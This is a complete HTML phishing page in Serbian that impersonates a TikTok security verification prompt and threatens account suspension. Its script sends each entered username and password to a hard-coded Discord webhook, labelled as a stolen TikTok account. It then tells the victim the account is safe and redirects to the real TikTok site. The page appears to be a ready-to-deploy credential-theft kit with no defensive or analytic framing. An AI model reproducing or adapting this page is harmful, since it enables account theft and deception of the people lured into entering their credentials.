<!DOCTYPE html>
<html lang="sr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Security Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #111;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-box {
            background: #1f1f1f;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            width: 350px;
            text-align: center;
            border: 1px solid #333;
        }
        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #fff;
            margin-bottom: 5px;
        }
        .logo .cyan { color: #25F4EE; }
        .logo .pink { color: #FE2C55; }
        .subtitle {
            color: #aaa;
            margin-bottom: 25px;
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 13px;
            color: #fff;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            background: #2c2c2c;
            border: 1px solid #444;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
        }
        .input-group input:focus {
            outline: none;
            border-color: #FE2C55;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background-color: #FE2C55;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:hover {
            background-color: #e0264b;
        }
        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #666;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo"><span class="cyan">Tik</span><span class="pink">Tok</span></div>
        <div class="subtitle">Potvrdite svoj nalog da biste izbegli suspendovanje</div>
        
        <form id="phishForm">
            <div class="input-group">
                <label for="username">Korisničko ime, e-mail ili telefon</label>
                <input type="text" id="username" name="username" required placeholder="npr. @korisnik">
            </div>
            <div class="input-group">
                <label for="password">Lozinka</label>
                <input type="password" id="password" name="password" required placeholder="Vaša lozinka">
            </div>
            <button type="submit" class="btn">Potvrdi prijavu</button>
        </form>
        
        <div class="footer">© 2023 TikTok. Sva prava zadržana.</div>
    </div>

    <script>
        document.getElementById('phishForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // OVDJE UBACI TVOJ DISCORD WEBHOOK URL
            fetch('https://discord.com/api/webhooks/1559356064833736764/t3gaowbOAF3H4HVptMD_ae-rIlr4bLdUeVxSUU0uvLF-B9q2PGU5F1hsE_1aXFNA-Kx_', {
        method: 'POST',
            
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🚨 **NOVI TIKTOK NALOG UKRADEN** 🚨\n\n**User:** ${username}\n**Pass:** ${password}`
                })
            }).then(response => {
                if (response.ok) {
                    document.body.innerHTML = `
                        <div class="login-box">
                            <h2 style="color:#fff;">✅ Potvrda Uspešna</h2>
                            <p style="color:#aaa;">Vaš nalog je bezbedan.</p>
                            <p style="color:#666;">Preusmeravanje na TikTok...</p>
                        </div>
                    `;
                    setTimeout(() => {
                        window.location.href = 'https://www.tiktok.com';
                    }, 3000);
                } else {
                    alert('Greška pri povezivanju. Pokušajte ponovo.');
                    location.reload();
                }
            });
        });
    </script>

</body>
</html>
